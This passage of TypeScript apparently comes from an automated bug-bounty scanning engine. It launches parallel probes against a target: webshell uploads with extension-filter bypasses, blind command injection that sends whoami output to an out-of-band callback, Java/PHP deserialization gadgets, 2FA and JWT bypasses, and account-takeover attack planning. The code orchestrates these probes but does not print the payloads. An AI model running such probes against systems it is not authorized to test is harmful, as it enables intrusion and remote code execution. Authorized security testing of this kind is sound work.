                evidence: [{ id: uuidv4(), source: "secret_scanner", data: { endpoint: hyp.endpoint, detail: hyp.reasoning }, tags: [hyp.vulnClass], anomalyScore: hyp.confidence, timestamp: Date.now() }],
                status: "pending", createdAt: Date.now(),
              });
            }
            this.emit("hunt:secrets_found", {
              sessionId: this.state.sessionId,
              count: secretResult.matches.length,
              types: [...new Set(secretResult.matches.map(m => m.type))],
            });
            await notificationService.notifyIfWorthy({
              type: "secret_found",
              targetUrl: this.state.targetUrl,
              detail: secretResult.matches.map(m => `${m.type}: ${m.value}`).join(", "),
            });
          }
        } catch (err) {
          logger.debug("[HunterEngine] Secret scan skipped (non-critical)", { err: String(err) });
        }
      })(),

      // Error-disclosure probing — deliberately provoke exceptions with
      // malformed input and scan the error response for leaked secrets or
      // internal paths/stack traces. secretScanner above only ever scans clean
      // 200 responses on a fixed static-path list — an app that echoes raw
      // error.message back to the client on failure is invisible to that scan.
      (async () => {
        try {
          const disclosureResult = await errorDisclosureProber.probe(this.state.targetUrl, this.authHeaders, this.state.programId);
          for (const hyp of disclosureResult.hypotheses) {
            this.state.hypotheses.push({
              id: uuidv4(), vulnClass: hyp.vulnClass, targetUrl: hyp.endpoint || this.state.targetUrl,
              reasoning: hyp.reasoning, confidence: hyp.confidence, priority: hyp.priority,
              evidence: [{ id: uuidv4(), source: "error_disclosure_prober", data: { endpoint: hyp.endpoint, detail: hyp.reasoning }, tags: [hyp.vulnClass], anomalyScore: hyp.confidence, timestamp: Date.now() }],
              status: "pending", createdAt: Date.now(),
            });
          }
          if (disclosureResult.findings.length > 0) {
            this.emit("hunt:secrets_found", {
              sessionId: this.state.sessionId,
              count: disclosureResult.findings.length,
              types: [...new Set(disclosureResult.findings.flatMap(f => f.secretsFound.length > 0 ? f.secretsFound : f.pathsLeaked))],
            });
          }
        } catch (err) {
          logger.debug("[HunterEngine] Error-disclosure probe skipped (non-critical)", { err: String(err) });
        }
      })(),

      // Diff-based change detection — compare endpoint responses against last baseline
      (async () => {
        try {
          const changeReport = await changeDetector.detect(this.state.targetUrl, this.authHeaders, this.state.programId);
          for (const hyp of changeReport.hypotheses) {
            this.state.hypotheses.push({
              id: uuidv4(),
              vulnClass: hyp.vulnClass,
              targetUrl: hyp.endpoint || this.state.targetUrl,
              reasoning: hyp.reasoning,
              confidence: hyp.confidence,
              priority: hyp.priority,
              evidence: [{ id: uuidv4(), source: "change_detector", data: { endpoint: hyp.endpoint, detail: hyp.reasoning }, tags: [hyp.vulnClass], anomalyScore: hyp.confidence, timestamp: Date.now() }],
              status: "pending",
              createdAt: Date.now(),
            });
          }
          if (changeReport.newEndpoints.length > 0 || changeReport.changedEndpoints.length > 0) {
            this.emit("hunt:changes_detected", {
              sessionId: this.state.sessionId,
              newEndpoints: changeReport.newEndpoints,
              changed: changeReport.changedEndpoints.length,
            });
          }
        } catch (err) {
          logger.debug("[HunterEngine] Change detection skipped (non-critical)", { err: String(err) });
        }
      })(),

      // WebSocket security probing
      (async () => {
        try {
          const wsResult = await webSocketProber.probe(this.state.targetUrl, this.authHeaders, this.state.programId);
          for (const hyp of wsResult.hypotheses) {
            this.state.hypotheses.push({
              id: uuidv4(), vulnClass: hyp.vulnClass, targetUrl: hyp.endpoint || this.state.targetUrl,
              reasoning: hyp.reasoning, confidence: hyp.confidence, priority: hyp.priority,
              evidence: [{ id: uuidv4(), source: "websocket_probe", data: { endpoint: hyp.endpoint, detail: hyp.reasoning, raw: hyp.raw }, tags: [hyp.vulnClass], anomalyScore: hyp.confidence, timestamp: Date.now() }],
              status: "pending", createdAt: Date.now(),
            });
          }
          if (wsResult.vulns.length > 0) {
            this.emit("hunt:ws_vulns", { sessionId: this.state.sessionId, count: wsResult.vulns.length, endpoints: wsResult.endpointsFound, issues: wsResult.vulns.map(v => v.issue) });
          }
        } catch (err) { logger.debug("[HunterEngine] WS probe skipped", { err: String(err) }); }
      })(),

      // Cloud bucket exposure probing
      (async () => {
        try {
          const bucketResult = await cloudBucketProber.probe(this.state.targetUrl, this.state.programId);
          for (const hyp of bucketResult.hypotheses) {
            this.state.hypotheses.push({
              id: uuidv4(), vulnClass: hyp.vulnClass, targetUrl: hyp.endpoint || this.state.targetUrl,
              reasoning: hyp.reasoning, confidence: hyp.confidence, priority: hyp.priority,
              evidence: [{ id: uuidv4(), source: "cloud_bucket_probe", data: { endpoint: hyp.endpoint, detail: hyp.reasoning, raw: hyp.raw }, tags: [hyp.vulnClass], anomalyScore: hyp.confidence, timestamp: Date.now() }],
              status: "pending", createdAt: Date.now(),
            });
          }
          if (bucketResult.buckets.length > 0) {
            this.emit("hunt:bucket_exposed", { sessionId: this.state.sessionId, buckets: bucketResult.buckets.map(b => ({ url: b.bucketUrl, provider: b.provider, listable: b.listable })) });
            for (const bucket of bucketResult.buckets) {
              if (bucket.severity === "critical" || bucket.severity === "high") {
                await notificationService.notifyIfWorthy({ type: "finding_confirmed", severity: bucket.severity, vulnType: "cloud_storage_exposure", targetUrl: bucket.bucketUrl, detail: bucket.detail }).catch(() => {});
              }
            }
          }
        } catch (err) { logger.debug("[HunterEngine] Bucket probe skipped", { err: String(err) }); }
      })(),

      // Prototype pollution probing
      (async () => {
        try {
          const ppResult = await prototypePollutionProber.probe(this.state.targetUrl, this.authHeaders, this.state.programId);
          for (const hyp of ppResult.hypotheses) {
            this.state.hypotheses.push({
              id: uuidv4(), vulnClass: hyp.vulnClass, targetUrl: hyp.endpoint || this.state.targetUrl,
              reasoning: hyp.reasoning, confidence: hyp.confidence, priority: hyp.priority,
              evidence: [{ id: uuidv4(), source: "prototype_pollution_probe", data: { endpoint: hyp.endpoint, detail: hyp.reasoning, raw: hyp.raw }, tags: [hyp.vulnClass], anomalyScore: hyp.confidence, timestamp: Date.now() }],
              status: "pending", createdAt: Date.now(),
            });
          }
          if (ppResult.vulns.length > 0) {
            this.emit("hunt:proto_pollution", { sessionId: this.state.sessionId, count: ppResult.vulns.length, reflected: ppResult.vulns.some(v => v.reflected) });
          }
        } catch (err) { logger.debug("[HunterEngine] Prototype pollution probe skipped", { err: String(err) }); }
      })(),

      // Race condition probing
      (async () => {
        try {
          const raceResult = await raceConditionDetector.probe(this.state.targetUrl, this.authHeaders, this.state.programId);
          for (const hyp of raceResult.hypotheses) {
            this.state.hypotheses.push({
              id: uuidv4(), vulnClass: hyp.vulnClass, targetUrl: hyp.endpoint || this.state.targetUrl,
              reasoning: hyp.reasoning, confidence: hyp.confidence, priority: hyp.priority,
              evidence: [{ id: uuidv4(), source: "race_condition_detector", data: { endpoint: hyp.endpoint, detail: hyp.reasoning, raw: hyp.raw }, tags: [hyp.vulnClass], anomalyScore: hyp.confidence, timestamp: Date.now() }],
              status: "pending", createdAt: Date.now(),
            });
          }
          if (raceResult.vulns.length > 0) {
            this.emit("hunt:race_condition", { sessionId: this.state.sessionId, count: raceResult.vulns.length, endpoints: raceResult.vulns.map(v => v.endpoint) });
          }
        } catch (err) { logger.debug("[HunterEngine] Race condition probe skipped", { err: String(err) }); }
      })(),

      // Host header injection probing
      (async () => {
        try {
          const hhResult = await hostHeaderProber.probe(this.state.targetUrl, this.authHeaders, this.state.programId);
          for (const hyp of hhResult.hypotheses) {
            this.state.hypotheses.push({ id: uuidv4(), vulnClass: hyp.vulnClass, targetUrl: hyp.endpoint || this.state.targetUrl, reasoning: hyp.reasoning, confidence: hyp.confidence, priority: hyp.priority, evidence: [{ id: uuidv4(), source: "host_header_probe", data: { endpoint: hyp.endpoint, detail: hyp.reasoning, raw: hyp.raw }, tags: [hyp.vulnClass], anomalyScore: hyp.confidence, timestamp: Date.now() }], status: "pending", createdAt: Date.now() });
          }
          if (hhResult.vulns.length > 0) this.emit("hunt:host_header", { sessionId: this.state.sessionId, count: hhResult.vulns.length, techniques: hhResult.vulns.map(v => v.technique) });
        } catch (err) { logger.debug("[HunterEngine] Host header probe skipped", { err: String(err) }); }
      })(),

      // CRLF injection probing
      (async () => {
        try {
          const crlfResult = await crlfProber.probe(this.state.targetUrl, this.authHeaders, this.state.programId);
          for (const hyp of crlfResult.hypotheses) {
            this.state.hypotheses.push({ id: uuidv4(), vulnClass: hyp.vulnClass, targetUrl: hyp.endpoint || this.state.targetUrl, reasoning: hyp.reasoning, confidence: hyp.confidence, priority: hyp.priority, evidence: [{ id: uuidv4(), source: "crlf_probe", data: { endpoint: hyp.endpoint, detail: hyp.reasoning, raw: hyp.raw }, tags: [hyp.vulnClass], anomalyScore: hyp.confidence, timestamp: Date.now() }], status: "pending", createdAt: Date.now() });
          }
          if (crlfResult.vulns.length > 0) this.emit("hunt:crlf", { sessionId: this.state.sessionId, count: crlfResult.vulns.length });
        } catch (err) { logger.debug("[HunterEngine] CRLF probe skipped", { err: String(err) }); }
      })(),

      // Cookie security flag checking
      (async () => {
        try {
          const cookieResult = await cookieFlagChecker.check(this.state.targetUrl, this.authHeaders, this.state.programId);
          for (const hyp of cookieResult.hypotheses) {
            this.state.hypotheses.push({ id: uuidv4(), vulnClass: hyp.vulnClass, targetUrl: hyp.endpoint || this.state.targetUrl, reasoning: hyp.reasoning, confidence: hyp.confidence, priority: hyp.priority, evidence: [{ id: uuidv4(), source: "cookie_flag_checker", data: { endpoint: hyp.endpoint, detail: hyp.reasoning, raw: hyp.raw }, tags: [hyp.vulnClass], anomalyScore: hyp.confidence, timestamp: Date.now() }], status: "pending", createdAt: Date.now() });
          }
          if (cookieResult.issues.length > 0) this.emit("hunt:cookie_flags", { sessionId: this.state.sessionId, issues: cookieResult.issues.length, sessionCookies: cookieResult.issues.filter(i => i.isSessionCookie).length });
        } catch (err) { logger.debug("[HunterEngine] Cookie flag check skipped", { err: String(err) }); }
      })(),

      // JS/SPA crawling — extract hidden API endpoints + visual event tags
      (async () => {
        try {
          const crawlResult = await deepCrawl(this.state.targetUrl, { maxDepth: 2, maxPages: 20, authHeaders: this.authHeaders, programId: this.state.programId });
          for (const hyp of crawlResult.hypotheses) {
            this.state.hypotheses.push({ id: uuidv4(), vulnClass: hyp.vulnClass, targetUrl: hyp.targetUrl || this.state.targetUrl, reasoning: hyp.reasoning, confidence: hyp.confidence, priority: hyp.priority, evidence: [{ id: uuidv4(), source: "deep_crawl", data: { endpoint: hyp.targetUrl, detail: hyp.reasoning }, tags: [hyp.vulnClass], anomalyScore: hyp.confidence, timestamp: Date.now() }], status: "pending", createdAt: Date.now() });
          }
          if (crawlResult.endpointsFound.length > 0) {
            this.emit("hunt:endpoints_discovered", { sessionId: this.state.sessionId, count: crawlResult.endpointsFound.length, endpoints: crawlResult.endpointsFound.slice(0, 10).map(e => e.url), pagesVisited: crawlResult.pagesVisited });
            // Feeds the post-crawl EffortScaler rescale (see runLoop) — real
            // discovered surface, not the launch string.
            this.state.discoveredEndpoints.push(...crawlResult.endpointsFound.map(e => e.url));
          }
          if (crawlResult.visualTags.length > 0) {
            // Inject visual tags as an observation so the model can reason over them
            this.state.observations.push({
              id: uuidv4(),
              source: "visual_observer",
              data: { tags: crawlResult.visualTags, count: crawlResult.visualTags.length },
              tags: ["visual", "dom", "browser"],
              anomalyScore: crawlResult.visualTags.some(t => t.startsWith("[DIALOG") || /SQL|stack.trace|JS_ERR/i.test(t)) ? 0.8 : 0.3,
              timestamp: Date.now(),
            });
            this.emit("hunt:visual_tags", { sessionId: this.state.sessionId, count: crawlResult.visualTags.length, tags: crawlResult.visualTags.slice(0, 20) });
          }
        } catch (err) { logger.debug("[HunterEngine] JS/SPA crawl skipped", { err: String(err) }); }
      })(),

      // Backward planner — seed goal-directed attack path hypotheses
      (async () => {
        try {
          const plan = backwardPlanner.planHunt(
            this.state.sessionId,
            "Account Takeover",
            { complexity: 0.5, wafDetected: false, cloudHosted: false, authRequired: !!this.authConfig },
            { programId: String(this.state.programId), programAge: 180, reportCount: 50, noveltyFloor: 0.2 }
          );
          for (const phase of plan.phases.slice(0, 2)) {
            for (const action of phase.actions.slice(0, 3)) {
              const vulnClass = action.toLowerCase().replace(/[^a-z_]/g, "_");
              this.state.hypotheses.push({
                id: uuidv4(), vulnClass: vulnClass || "misconfig",
                targetUrl: this.state.targetUrl,
                reasoning: `Backward planner: ${plan.goal} — ${phase.name}: ${action}`,
                confidence: 0.5, priority: 6,
                evidence: [], status: "pending", createdAt: Date.now(),
              });
            }
          }
          this.emit("hunt:plan_seeded", { sessionId: this.state.sessionId, goal: plan.goal, phases: plan.phases.length });
          this.emit("hunt:ai_reasoning", {
            sessionId: this.state.sessionId,
            task: "Strategic Planning",
            phase: "decision",
            summary: `Backward planner set goal: "${plan.goal}". ${plan.phases.length} attack phase(s) seeded.`,
          });
        } catch (err) { logger.debug("[HunterEngine] Backward planner seeding skipped", { err: String(err) }); }
      })(),

      // Tech-payload selector — extract tech stack and inject tech-specific hypotheses
      (async () => {
        try {
          const techObs = this.state.observations.find(o => o.source === "whatweb");
          const techList: string[] = [];
          if (techObs?.data?.technologies && Array.isArray(techObs.data.technologies)) {
            for (const entry of techObs.data.technologies) {
              if (typeof entry === "object" && entry !== null) {
                techList.push(...Object.keys(entry as Record<string, unknown>));
              }
            }
          }
          if (techList.length > 0) {
            const profile = techPayloadSelector.select(techList);

            // Actually SEND the tech-tailored payloads and probe the debug
            // routes — these used to be built and then discarded before
            // dispatch (only the description string survived, as a hypothesis
            // with no real evidence ever tested). Real evidence now attaches
            // to real hypotheses, same pattern as every other OBSERVE-phase
            // prober fixed this session.
            const probed = await techPayloadProber.probe(
              this.state.targetUrl, profile.payloads, profile.debugRoutes, this.authHeaders, this.state.programId
            );
            for (const hyp of probed.hypotheses) {
              this.state.hypotheses.push({
                id: uuidv4(), vulnClass: hyp.vulnClass,
                targetUrl: hyp.endpoint || this.state.targetUrl,
                reasoning: `Tech-specific (${profile.detected.join(",")}): ${hyp.reasoning}`,
                confidence: hyp.confidence, priority: hyp.priority,
                evidence: [{
                  id: uuidv4(), source: "tech_payload_prober",
                  data: {
                    endpoint: hyp.endpoint, detail: hyp.reasoning, response: hyp.evidenceSnippet,
                    technique: hyp.technique, rawPayload: hyp.rawPayload,
                  },
                  tags: [hyp.vulnClass], anomalyScore: hyp.confidence, timestamp: Date.now(),
                }],
                status: "pending", createdAt: Date.now(),
              });
            }

            // Anything techPayloadProber didn't itself test (mass_assignment,
            // prototype_pollution, GraphQL-shaped info_disclosure) already has
            // a dedicated, more rigorous prober elsewhere in the hunt — still
            // seed it as priority signal for that prober rather than testing
            // it a second way here. Filtered off the SAME classification the
            // prober uses internally, so this can't silently drift out of
            // sync with what techPayloadProber.probe() actually dispatches.
            const remaining = profile.payloads.filter(p => !isDispatchedByTechPayloadProber(p));
            for (const payload of remaining.slice(0, 5)) {
              this.state.hypotheses.push({
                id: uuidv4(), vulnClass: payload.vulnClass,
                targetUrl: this.state.targetUrl,
                reasoning: `Tech-specific (${profile.detected.join(",")}): ${payload.description}`,
                confidence: 0.6, priority: 7,
                evidence: [], status: "pending", createdAt: Date.now(),
              });
            }

            if (profile.payloads.length > 0) this.emit("hunt:tech_payloads", { sessionId: this.state.sessionId, techs: profile.detected, payloadCount: profile.payloads.length, confirmedByProbing: probed.findings.length });
          }
        } catch (err) { logger.debug("[HunterEngine] Tech payload selector skipped", { err: String(err) }); }
      })(),

      // Parameter discovery — find injectable params via batch fuzzing
      (async () => {
        try {
          const paramResult = await parameterDiscovery.discover(this.state.targetUrl, this.authHeaders, this.state.programId);
          for (const hyp of paramResult.hypotheses) {
            this.state.hypotheses.push({
              id: uuidv4(), vulnClass: hyp.vulnClass, targetUrl: hyp.targetUrl || this.state.targetUrl,
              reasoning: hyp.reasoning, confidence: hyp.confidence, priority: hyp.priority,
              evidence: [{ id: uuidv4(), source: "parameter_discovery", data: { reasoning: hyp.reasoning, targetUrl: hyp.targetUrl }, tags: [hyp.vulnClass], anomalyScore: hyp.confidence, timestamp: Date.now() }],
              status: "pending", createdAt: Date.now(),
            });
          }
          if (paramResult.discovered.length > 0) {
            this.emit("hunt:params_discovered", { sessionId: this.state.sessionId, count: paramResult.discovered.length, params: paramResult.discovered.slice(0, 10).map(p => p.name) });
          }
        } catch (err) { logger.debug("[HunterEngine] Parameter discovery skipped", { err: String(err) }); }
      })(),

      // OAuth probe — detect OAuth/OIDC flows and test for misconfigurations
      (async () => {
        try {
          const oauthResult = await oauthProber.probe(this.state.targetUrl, this.authHeaders, this.state.programId);
          for (const hyp of oauthResult.hypotheses) {
            this.state.hypotheses.push({
              id: uuidv4(), vulnClass: hyp.vulnClass, targetUrl: hyp.endpoint || this.state.targetUrl,
              reasoning: hyp.reasoning, confidence: hyp.confidence, priority: hyp.priority,
              evidence: [{ id: uuidv4(), source: "oauth_probe", data: { endpoint: hyp.endpoint, detail: hyp.reasoning, raw: hyp.raw }, tags: [hyp.vulnClass], anomalyScore: hyp.confidence, timestamp: Date.now() }],
              status: "pending", createdAt: Date.now(),
            });
          }
          if (oauthResult.vulns.length > 0) {
            this.emit("hunt:oauth_vulns", { sessionId: this.state.sessionId, count: oauthResult.vulns.length, issues: oauthResult.vulns.map(v => v.issue) });
          }
        } catch (err) { logger.debug("[HunterEngine] OAuth probe skipped", { err: String(err) }); }
      })(),

      // Mass assignment probe — test for privileged field injection on update/register endpoints
      (async () => {
        try {
          const maResult = await massAssignmentProber.probe(this.state.targetUrl, this.authHeaders, this.state.programId);
          for (const hyp of maResult.hypotheses) {
            this.state.hypotheses.push({
              id: uuidv4(), vulnClass: hyp.vulnClass, targetUrl: hyp.endpoint || this.state.targetUrl,
              reasoning: hyp.reasoning, confidence: hyp.confidence, priority: hyp.priority,
              evidence: [{ id: uuidv4(), source: "mass_assignment_probe", data: { endpoint: hyp.endpoint, detail: hyp.reasoning, raw: hyp.raw }, tags: [hyp.vulnClass], anomalyScore: hyp.confidence, timestamp: Date.now() }],
              status: "pending", createdAt: Date.now(),
            });
          }
          if (maResult.vulns.length > 0) {
            this.emit("hunt:mass_assignment", { sessionId: this.state.sessionId, count: maResult.vulns.length, endpoints: maResult.vulns.map(v => v.endpoint) });
          }
        } catch (err) { logger.debug("[HunterEngine] Mass assignment probe skipped", { err: String(err) }); }
      })(),

      // Business logic probe — test cart, coupon, pricing flows for logic flaws
      (async () => {
        try {
          const bizResult = await businessLogicProber.probe(this.state.targetUrl, this.authHeaders, this.state.programId);
          for (const hyp of bizResult.hypotheses) {
            this.state.hypotheses.push({
              id: uuidv4(), vulnClass: hyp.vulnClass, targetUrl: hyp.endpoint || this.state.targetUrl,
              reasoning: hyp.reasoning, confidence: hyp.confidence, priority: hyp.priority,
              evidence: [{ id: uuidv4(), source: "business_logic_probe", data: { endpoint: hyp.endpoint, detail: hyp.reasoning }, tags: [hyp.vulnClass], anomalyScore: hyp.confidence, timestamp: Date.now() }],
              status: "pending", createdAt: Date.now(),
            });
          }
          if (bizResult.vulns.length > 0) {
            this.emit("hunt:business_logic", { sessionId: this.state.sessionId, count: bizResult.vulns.length, types: [...new Set(bizResult.vulns.map(v => v.technique))] });
          }
        } catch (err) { logger.debug("[HunterEngine] Business logic probe skipped", { err: String(err) }); }
      })(),

      // 2FA bypass probe — test for OTP skip, null code, step skip attacks
      (async () => {
        try {
          const tfaResult = await twoFactorBypassProber.probe(this.state.targetUrl, this.authHeaders, this.state.programId);
          for (const hyp of tfaResult.hypotheses) {
            this.state.hypotheses.push({
              id: uuidv4(), vulnClass: hyp.vulnClass, targetUrl: hyp.endpoint || this.state.targetUrl,
              reasoning: hyp.reasoning, confidence: hyp.confidence, priority: hyp.priority,
              evidence: [{ id: uuidv4(), source: "two_factor_bypass_probe", data: { endpoint: hyp.endpoint, detail: hyp.reasoning, raw: hyp.raw }, tags: [hyp.vulnClass], anomalyScore: hyp.confidence, timestamp: Date.now() }],
              status: "pending", createdAt: Date.now(),
            });
          }
          if (tfaResult.vulns.length > 0) {
            this.emit("hunt:2fa_bypass", { sessionId: this.state.sessionId, count: tfaResult.vulns.length, techniques: tfaResult.vulns.map(v => v.technique) });
          }
        } catch (err) { logger.debug("[HunterEngine] 2FA bypass probe skipped", { err: String(err) }); }
      })(),

      // JWT confusion probe — alg:none, weak secrets, kid injection
      (async () => {
        try {
          const jwtResult = await jwtConfusionProber.probe(this.state.targetUrl, this.authHeaders, this.state.programId);
          for (const hyp of jwtResult.hypotheses) {
            // No per-vuln endpoint here — JWT confusion is a token-validation-
            // mechanism flaw, not tied to one specific URL, so the root target
            // is the correct (only) anchor. Evidence is still preserved below,
            // unlike before.
            this.state.hypotheses.push({
              id: uuidv4(), vulnClass: hyp.vulnClass, targetUrl: this.state.targetUrl,
              reasoning: hyp.reasoning, confidence: hyp.confidence, priority: hyp.priority,
              evidence: [{ id: uuidv4(), source: "jwt_confusion_probe", data: { detail: hyp.reasoning, raw: hyp.raw }, tags: [hyp.vulnClass], anomalyScore: hyp.confidence, timestamp: Date.now() }],
              status: "pending", createdAt: Date.now(),
            });
          }
          if (jwtResult.vulns.length > 0) {
            this.emit("hunt:jwt_vulns", { sessionId: this.state.sessionId, count: jwtResult.vulns.length, techniques: jwtResult.vulns.map(v => v.technique) });
          }
        } catch (err) { logger.debug("[HunterEngine] JWT confusion probe skipped", { err: String(err) }); }
      })(),

      // Open redirect chain probe — detect open redirects and chain to OAuth/XSS
      (async () => {
        try {
          const orResult = await openRedirectChainProber.probe(this.state.targetUrl, this.authHeaders, this.state.programId);
          for (const hyp of orResult.hypotheses) {
            this.state.hypotheses.push({
              id: uuidv4(), vulnClass: hyp.vulnClass, targetUrl: hyp.endpoint || this.state.targetUrl,
              reasoning: hyp.reasoning, confidence: hyp.confidence, priority: hyp.priority,
              evidence: [{ id: uuidv4(), source: "open_redirect_chain_probe", data: { endpoint: hyp.endpoint, detail: hyp.reasoning, raw: hyp.raw }, tags: [hyp.vulnClass], anomalyScore: hyp.confidence, timestamp: Date.now() }],
              status: "pending", createdAt: Date.now(),
            });
          }
          if (orResult.vulns.length > 0) {
            this.emit("hunt:open_redirect", { sessionId: this.state.sessionId, count: orResult.vulns.length, chained: orResult.vulns.filter(v => v.chainable).length });
          }
        } catch (err) { logger.debug("[HunterEngine] Open redirect chain probe skipped", { err: String(err) }); }
      })(),

      // Blind XXE probe — OOB-based XML external entity detection
      (async () => {
        try {
          const xxeResult = await blindXXEProber.probe(this.state.targetUrl, this.authHeaders, this.state.programId);
          for (const hyp of xxeResult.hypotheses) {
            this.state.hypotheses.push({
              id: uuidv4(), vulnClass: hyp.vulnClass, targetUrl: hyp.endpoint || this.state.targetUrl,
              reasoning: hyp.reasoning, confidence: hyp.confidence, priority: hyp.priority,
              evidence: [{ id: uuidv4(), source: "blind_xxe_probe", data: { endpoint: hyp.endpoint, detail: hyp.reasoning, raw: hyp.raw }, tags: [hyp.vulnClass], anomalyScore: hyp.confidence, timestamp: Date.now() }],
              status: "pending", createdAt: Date.now(),
            });
          }
          if (xxeResult.vulns.length > 0) {
            this.emit("hunt:xxe_found", { sessionId: this.state.sessionId, count: xxeResult.vulns.length, oobConfirmed: xxeResult.vulns.some(v => v.oobReceived) });
          }
        } catch (err) { logger.debug("[HunterEngine] Blind XXE probe skipped", { err: String(err) }); }
      })(),

      // Java/PHP deserialization probe — OOB-confirmed via ysoserial (Java
      // URLDNS gadget) and phpggc (Guzzle/Monolog gadget chains), with a
      // fingerprint-only fallback for both when the OOB tools are unavailable
      // or don't fire. probeDeserialize (fired later, per-hypothesis) only
      // covers Node.js node-serialize gadgets — this is the only Java/PHP
      // deserialization coverage in the codebase.
      (async () => {
        try {
          const deserResult = await deserializationProber.probe(this.state.targetUrl, this.authHeaders, this.state.programId);
          for (const hyp of deserResult.hypotheses) {
            this.state.hypotheses.push({
              id: uuidv4(), vulnClass: hyp.vulnClass, targetUrl: hyp.endpoint || this.state.targetUrl,
              reasoning: hyp.reasoning, confidence: hyp.confidence, priority: hyp.priority,
              evidence: [{ id: uuidv4(), source: "deserialization_prober", data: { endpoint: hyp.endpoint, detail: hyp.reasoning, raw: hyp.raw }, tags: [hyp.vulnClass], anomalyScore: hyp.confidence, timestamp: Date.now() }],
              status: "pending", createdAt: Date.now(),
            });
          }
          if (deserResult.vulns.length > 0) {
            this.emit("hunt:deserialization_found", { sessionId: this.state.sessionId, count: deserResult.vulns.length, oobConfirmed: deserResult.vulns.some(v => v.oobReceived) });
          }
        } catch (err) { logger.debug("[HunterEngine] Deserialization probe skipped", { err: String(err) }); }
      })(),

      // File upload → webshell RCE probe — uploads real PHP/JSP/ASP webshells
      // across extension-filter bypass variants, then confirms execution via
      // an arithmetic canary (server-computed product in the response, not
      // the literal source) rather than a substring/reflection heuristic.
      (async () => {
        try {
          const uploadResult = await fileUploadWebshellProber.probe(this.state.targetUrl, this.authHeaders, this.state.programId);
          for (const hyp of uploadResult.hypotheses) {
            this.state.hypotheses.push({
              id: uuidv4(), vulnClass: hyp.vulnClass, targetUrl: hyp.endpoint || this.state.targetUrl,
              reasoning: hyp.reasoning, confidence: hyp.confidence, priority: hyp.priority,
              evidence: [{ id: uuidv4(), source: "file_upload_webshell_prober", data: { endpoint: hyp.endpoint, detail: hyp.reasoning, raw: hyp.raw }, tags: [hyp.vulnClass], anomalyScore: hyp.confidence, timestamp: Date.now() }],
              status: "pending", createdAt: Date.now(),
            });
          }
          if (uploadResult.vulns.length > 0) {
            this.emit("hunt:file_upload_found", { sessionId: this.state.sessionId, count: uploadResult.vulns.length, rceConfirmed: uploadResult.vulns.some(v => v.technique === "webshell_rce_confirmed") });
          }
        } catch (err) { logger.debug("[HunterEngine] File upload webshell probe skipped", { err: String(err) }); }
      })(),

      // Blind OS command injection probe — polyglot shell-separator payload
      // against network-utility-style endpoints (ping/dns/traceroute/exec),
      // confirmed via a real OOB callback carrying exfiltrated `whoami`
      // output (not just "the callback fired"). This is the only active
      // probe for the generic "rce" vulnClass; the alternative (nuclei's
      // "rce" tag) is signature-only CVE matching, not live exploitation.
      (async () => {
        try {
          const cmdResult = await blindCommandInjectionProber.probe(this.state.targetUrl, this.authHeaders, this.state.programId);
          for (const hyp of cmdResult.hypotheses) {
            this.state.hypotheses.push({
              id: uuidv4(), vulnClass: hyp.vulnClass, targetUrl: hyp.endpoint || this.state.targetUrl,
              reasoning: hyp.reasoning, confidence: hyp.confidence, priority: hyp.priority,
              evidence: [{ id: uuidv4(), source: "blind_command_injection_prober", data: { endpoint: hyp.endpoint, detail: hyp.reasoning, raw: hyp.raw }, tags: [hyp.vulnClass], anomalyScore: hyp.confidence, timestamp: Date.now() }],
              status: "pending", createdAt: Date.now(),
            });
          }
          if (cmdResult.vulns.length > 0) {
            this.emit("hunt:command_injection_found", { sessionId: this.state.sessionId, count: cmdResult.vulns.length, oobConfirmed: cmdResult.vulns.some(v => v.oobReceived) });
          }
        } catch (err) { logger.debug("[HunterEngine] Blind command injection probe skipped", { err: String(err) }); }
      })(),

      // ZAP passive scanner — spider the target and surface passive-scan findings
      (async () => {
        try {
          const zapResult = await zapScanner.scan(this.state.targetUrl, this.authHeaders);
          if (!zapResult.available) return;

          for (const hyp of zapResult.hypotheses) {
            this.state.hypotheses.push({
              id: uuidv4(),
              vulnClass: hyp.vulnClass,
              targetUrl: hyp.targetUrl,
              reasoning: hyp.reasoning,
              confidence: hyp.confidence,
              priority: hyp.priority,
              evidence: hyp.evidence ? [{ id: uuidv4(), source: "zap", data: { raw: hyp.evidence, parameter: hyp.parameter, cweId: hyp.cweId }, tags: [hyp.vulnClass, "zap"], anomalyScore: hyp.confidence, timestamp: Date.now() }] : [],
              status: "pending",
              createdAt: Date.now(),
            });
          }

          // Surface newly discovered endpoints as observations
          if (zapResult.endpointsDiscovered.length > 0) {
            this.state.observations.push({
              id: uuidv4(),
              source: "zap_spider",
              data: { endpoints: zapResult.endpointsDiscovered, count: zapResult.endpointsDiscovered.length },
              tags: ["endpoints", "zap"],
              anomalyScore: 0.3,
              timestamp: Date.now(),
            });
          }

          if (zapResult.hypotheses.length > 0 || zapResult.endpointsDiscovered.length > 0) {
            this.emit("hunt:zap_scan", {
              sessionId: this.state.sessionId,
              alertCount: zapResult.alertCount,
              hypothesesSeeded: zapResult.hypotheses.length,
              endpointsDiscovered: zapResult.endpointsDiscovered.length,
              duration: zapResult.duration,
            });
          }
        } catch (err) { logger.debug("[HunterEngine] ZAP scan skipped (non-critical)", { err: String(err) }); }
      })(),
      ]);
      logger.info("[OBSERVE] Promise.allSettled parallel probes done", { session: this.state.sessionId });
    }
  }

  private async probeGraphQL(): Promise<void> {
    const endpoints = await graphqlProber.detectEndpoints(this.state.targetUrl, this.authHeaders, this.state.programId);
    if (!endpoints.length) return;

    for (const ep of endpoints) {
      const schema = await graphqlProber.introspect(ep, this.authHeaders, this.state.programId);
      if (!schema) continue;

      const seeds = graphqlProber.toHypothesisSeeds(schema);
      for (const seed of seeds) {
        this.state.hypotheses.push({
          id: uuidv4(),
          vulnClass: seed.vulnClass,
          targetUrl: seed.targetUrl,
          reasoning: seed.reasoning,
          confidence: seed.confidence,
          priority: seed.priority,
          evidence: [],
          status: "pending",
          createdAt: Date.now(),
        });
      }

      this.emit("hunt:graphql_schema", {
        sessionId: this.state.sessionId,
        endpoint: ep,
        typeCount: schema.typeCount,
        injectableCount: schema.injectableArgs.length,
      });
      logger.info("[HunterEngine] GraphQL schema mapped", { endpoint: ep, typeCount: schema.typeCount });

      if (this.state.hypotheses.length > MAX_HYPOTHESES) {
        this.state.hypotheses.sort((a, b) => truncationRank(b) - truncationRank(a));
        this.state.hypotheses.splice(MAX_HYPOTHESES);
      }
    }
  }

  private extractVersionedTechs(techObs: Record<string, unknown>): Array<{ name: string; version?: string }> {
    const raw = techObs.technologies;
    if (!Array.isArray(raw)) return [];

    const results: Array<{ name: string; version?: string }> = [];
    for (const entry of raw) {
      if (typeof entry !== 'object' || entry === null) continue;
